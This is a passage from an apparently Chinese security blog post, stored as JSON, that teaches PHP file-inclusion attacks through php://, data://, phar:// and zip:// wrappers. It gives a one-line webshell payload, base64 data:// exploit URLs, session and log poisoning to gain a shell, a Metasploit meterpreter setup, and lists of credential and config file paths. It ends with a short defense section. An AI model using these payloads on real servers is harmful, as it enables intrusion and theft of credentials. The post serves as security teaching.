过去 PHP 代码，即可执行。</p>\n<p>如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。</p>\n<p><code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> <br />\n<span class=\"lebal info\"> 图片</span></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p><span class=\"label info\">当 allow_url_include=Off 时是不行的</span></p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<h3 id=\"phpinput命令执行\"><a class=\"anchor\" href=\"#phpinput命令执行\">#</a> php://input 命令执行</h3>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；<br />\n<span class=\"lebal info\">图片</span></p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<h2 id=\"phpfilter本地磁盘文件进行读取\"><a class=\"anchor\" href=\"#phpfilter本地磁盘文件进行读取\">#</a> php://filter（本地磁盘文件进行读取）</h2>\n<p>元封装器，设计用于 &quot;数据流打开&quot; 时的 &quot;筛选过滤&quot; 应用，对本地磁盘文件进行读写。</p>\n<p>用法：<br />\n <code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code> <br />\n <code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  一样。</p>\n<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>\n<p>php://filter 参数</p>\n<table>\n    <tr>\n        <th>名称</th>\n        <th>描述</th>\n        <th>备注</th>\n    </tr>\n    <tr>\n        <td>resource=&lt;要过滤的数据流&gt;</td>\n        <td>指定了你要筛选过滤的数据流。</td>\n        <td>必选</td>\n    </tr>\n    <tr>\n        <td>read=&lt;读链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>write=&lt;写链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>&lt;；两个链的筛选列表&gt;</td>\n        <td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n        <td>&nbsp;</td>\n    </tr>\n</table>\n<p>过滤器详解<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=\"> https://blog.csdn.net/ni9htmar3/article/details/69812306#t8</span></p>\n<h2 id=\"file伪协议读取文件内容\"><a class=\"anchor\" href=\"#file伪协议读取文件内容\">#</a> file:// 伪协议 (读取文件内容)</h2>\n<p>通过 file 协议可以访问本地文件系统，读取到文件的内容</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image025.png\" alt=\"\" /></p>\n<h2 id=\"data伪协议\"><a class=\"anchor\" href=\"#data伪协议\">#</a> data:// 伪协议</h2>\n<p>数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  <code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</code></p>\n<p>data://（读取文件）<br />\n和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； <?php // 打印 \"I love PHP\" echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?></p>\n<p>注意：&lt;span style=&quot;color: rgb (121, 121, 121);&quot;&gt;&lt;?php phpinfo ();, 这类执行代码最后没有？&gt;&lt;/span &gt; 闭合；</p>\n<p>如果 php.ini 里的 allow_url_include=On（PHP &lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>payload:  <code>http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<h2 id=\"phar伪协议\"><a class=\"anchor\" href=\"#phar伪协议\">#</a> phar:// 伪协议</h2>\n<p>这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br />\n用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。<br />\n注意： PHP &gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br />\n步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"zip伪协议\"><a class=\"anchor\" href=\"#zip伪协议\">#</a> zip:// 伪协议</h2>\n<p>zip 伪协议和 phar 协议类似，但是用法不一样。<br />\n用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。<br />\n条件： PHP &gt; =5.3.0，注意在 windows 下测试要 5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"封装协议摘要\"><a class=\"anchor\" href=\"#封装协议摘要\">#</a> 封装协议摘要</h2>\n<table>\n    <tr>\n        <th>属性</th>\n        <th>支持</th>\n    </tr>\n    <tr>\n        <td>受限于 allow_url_include</td>\n        <td>仅 <em>php://input</em>、 <em>php://stdin</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>允许读取</td>\n        <td>仅 <em>php://stdin</em>、 <em>php://input</em>、 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许写入</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许追加</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>（等于写入）\n        </td>\n    </tr>\n    <tr>\n        <td>允许同时读写</td>\n        <td>仅 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>支持 stat()</td>\n        <td>仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>仅仅支持 stream_select()</td>\n        <td><em>php://stdin</em>、 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://fd</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n</table>\n<h1 id=\"文件包含姿势\"><a class=\"anchor\" href=\"#文件包含姿势\">#</a> 文件包含姿势</h1>\n<h2 id=\"文件包含session\"><a class=\"anchor\" href=\"#文件包含session\">#</a> 文件包含 session</h2>\n<p><span class=\"label info\">利用条件：</span></p>\n<p>session 的存储位置可以获取。</p>\n<ol>\n<li>通过 phpinfo 的信息可以获取到 session 的存储位置。</li>\n</ol>\n<p>通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>另一种只能猜测了<br />\n根据各版本的中间件猜测。</li>\n</ol>\n<p><span class=\"label info\">session 中的内容可以被控制，传入恶意代码。</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例代码</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$s</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">漏洞分析</span></p>\n<p>此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。</p>\n<p>当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p>session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到 666 已经存里面了</p>\n<p><span class=\"label info\">漏洞利用</span><br />\n通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。</p>\n<p>当访问 http://www.xxx.com/x.php?str=&lt;?php phpinfo ();?&gt; 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p><span class=\"label info\">结果</span></p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"文件包含日志\"><a class=\"anchor\" href=\"#文件包含日志\">#</a> 文件包含日志</h2>\n<p>利用条件：需要知道服务器日志的存储路径，且日志文件可读。</p>\n<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>\n<p><span class=\"label danger\">💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。</span></p>\n<p><span class=\"label info\">示例</span><br />\n<img data-src=\"image014.png\" alt=\"\" /></p>\n<p><span class=\"label success\">✔️还可以在 User-Agent 里插入 payload</span></p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p><span class=\"label danger\">💔有的日志文件里不一定会显示 UA 信息</span><br />\n<span class=\"label info\">示例</span><br />\n<img data-src=\"image017.png\" alt=\"\" /><br />\n这是因为 Apache 配置</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>详情见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIxLzAxLzIyL2FwYWNoZSVFOCVBRSVCRiVFOSU5NyVBRSVFNiU5NyVBNSVFNSVCRiU5NyVFOCVBRiVBNiVFOCVBNyVBMyVFMyU4MCU5MCVFOCVCRCVBQyVFMyU4MCU5MS8=\">https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/</span></p>\n<h2 id=\"msf-攻击模块\"><a class=\"anchor\" href=\"#msf-攻击模块\">#</a> MSF 攻击模块</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>举个例子</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/unix/webapp/php_include</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhost <span class=\"token number\">192.168</span>.199.12</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> rport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> phpuri /index.php?file<span class=\"token operator\">=</span>xxLFIxx</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> path http://192.168.199.147/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload php/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvport <span class=\"token number\">8888</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit -z</pre></td></tr></table></figure><h1 id=\"常见的敏感信息路径\"><a class=\"anchor\" href=\"#常见的敏感信息路径\">#</a> 常见的敏感信息路径</h1>\n<h2 id=\"windows系统\"><a class=\"anchor\" href=\"#windows系统\">#</a> <span class=\"label info\">Windows 系统</span></h2>\n<p>c:\\boot.ini// 查看系统版本</p>\n<p>c:\\windows\\system32\\inetsrv\\MetaBase.xml// IIS 配置文件</p>\n<p>c:\\windows\\repair\\sam // 存储 Windows 系统初次安装的密码</p>\n<p>c:\\ProgramFiles\\mysql\\my.ini// MySQL 配置</p>\n<p>c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD// MySQL root 密码</p>\n<p>c:\\windows\\php.ini//php 配置信息</p>\n<h2 id=\"linuxunix系统\"><a class=\"anchor\" href=\"#linuxunix系统\">#</a> <span class=\"label info\">Linux/Unix 系统</span></h2>\n<p>/etc/passwd// 账户信息</p>\n<p>/etc/shadow// 账户密码文件</p>\n<p>/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件</p>\n<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置</p>\n<p>/usr/local/app/php5/lib/php.ini// PHP 相关配置</p>\n<p>/etc/httpd/conf/httpd.conf// Apache 配置文件</p>\n<p>/etc/my.conf//mysql 配置文件</p>\n<h2 id=\"日志默认路径\"><a class=\"anchor\" href=\"#日志默认路径\">#</a> <span class=\"label info\">日志默认路径</span></h2>\n<p>apache+Linux 日志默认路径</p>\n<p><code>/etc/httpd/logs/access_log</code></p>\n<p>或者</p>\n<p><code>/var/log/httpd/access log</code></p>\n<p>apache+win2003 日志默认路径</p>\n<p><code>D:/xampp/apache/logs/access.log</code></p>\n<p><code>D:/xampp/apache/logs/error.log</code></p>\n<p>IIS6.0+win2003 默认日志文件</p>\n<p><code>C:/WINDOWS/system32/Logfiles</code></p>\n<p>IIS7.0+win2003 默认日志文件</p>\n<p><code>%SystemDrive%/inetpub/logs/LogFiles</code></p>\n<p>nginx 日志文件在用户安装目录的 logs 目录下</p>\n<p>如安装目录为 /usr/local/nginx, 则日志目录就是在</p>\n<p><code>/usr/local/nginx/logs</code></p>\n<p>也可通过其配置文件 Nginx.conf，获取到日志的存在路径</p>\n<p><code>/opt/nginx/logs/access.log</code></p>\n<p>web 中间件默认配置</p>\n<p>apache+linux 默认配置文件</p>\n<p><code>/etc/httpd/conf/httpd.conf</code></p>\n<p>或者</p>\n<p><code>index.php?page=/etc/init.d/httpd</code></p>\n<p>IIS6.0+win2003 配置文件</p>\n<p><code>C:/Windows/system32/inetsrv/metabase.xml</code></p>\n<p>IIS7.0+WIN 配置文件</p>\n<p><code>C:/Windows/System32/inetsrv/config/application/Host.config</code></p>\n<h1 id=\"文件包含漏洞的防御\"><a class=\"anchor\" href=\"#文件包含漏洞的防御\">#</a> 文件包含漏洞的防御</h1>\n<ol>\n<li>PHP 中使用 open_basedir 配置限制访问在指定的区域</li>\n<li>过滤.（点）/（反斜杠）\\（反斜杠）</li>\n<li>禁止服务器远程文件包含</li>\n</ol>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s\">https://www.freebuf.com/articles/web/182280.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=\">https://www.php.cn/toutiao-414790.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=\">https://blog.csdn.net/ni9htmar3/article/details/69812306</span></p>\n",
            "tags": [
                "文件包含"
            ]
        }
    ]
}